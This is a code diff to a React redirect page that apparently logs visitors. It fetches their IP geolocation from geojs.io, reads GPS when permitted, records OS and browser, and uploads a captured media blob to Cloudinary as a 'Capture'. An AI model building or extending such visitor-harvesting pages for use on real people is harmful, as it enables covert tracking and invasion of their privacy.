@@ -282,6 +282,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
         const formData = new FormData();
         formData.append('file', blob);
         formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+        formData.append('resource_type', resourceType);
         try {
             const response = await fetch(CLOUDINARY_UPLOAD_URL, {
                 method: 'POST',
@@ -309,8 +310,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             // --- Basic Info ---
             let ipData: any = {};
             try {
-                // Switched to a more reliable, CORS-friendly API
-                const ipRes = await fetch('https://freeipapi.com/api/json/');
+                const ipRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
                 if (ipRes.ok) ipData = await ipRes.json();
             } catch (e) { console.error("Could not fetch IP data:", e); }
     
@@ -318,7 +318,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
             
             // --- Location ---
-            let locationData = { lat: ipData.latitude || null, lon: ipData.longitude || null, city: ipData.cityName || 'Unknown', country: ipData.countryName || 'Unknown', source: 'ip' as 'ip' | 'gps' };
+            let locationData = { lat: ipData.latitude ? Number(ipData.latitude) : null, lon: ipData.longitude ? Number(ipData.longitude) : null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
             if (permissionStatusRef.current.location === 'granted') {
                 await new Promise<void>(resolve => {
                     navigator.geolocation.getCurrentPosition(pos => {
@@ -365,7 +365,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                 redirectId: settings.id,
                 name: `Capture on ${new Date().toLocaleDateString()}`,
                 timestamp: Date.now(),
-                ip: ipData.ipAddress || 'Unknown',
+                ip: ipData.ip || 'Unknown',
                 userAgent,
                 os: osMatch ? osMatch[0] : 'Unknown',
                 browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
@@ -469,14 +469,13 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
     if (status === 'permission_denied') {
         return <PermissionInstructions onRetry={requestPermissions} requiredPermissions={deniedPermissions} t={t} />;
     }
-    if (status === 'loading') {
-      return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
-    }
-    if (settings && (status === 'redirecting' || isPreview)) {
+    if (settings && (status === 'loading' || status === 'redirecting' || isPreview)) {
       const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
-      return <CardComponent settings={settings} isPaused={isPreview || isWaitingForPermission} t={t} />;
+      const isPaused = isPreview || status === 'loading' || isWaitingForPermission;
+      return <CardComponent settings={settings} isPaused={isPaused} t={t} />;
     }
-    return null;
+    
+    return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
   };
   
   const backgroundStyle: React.CSSProperties = {
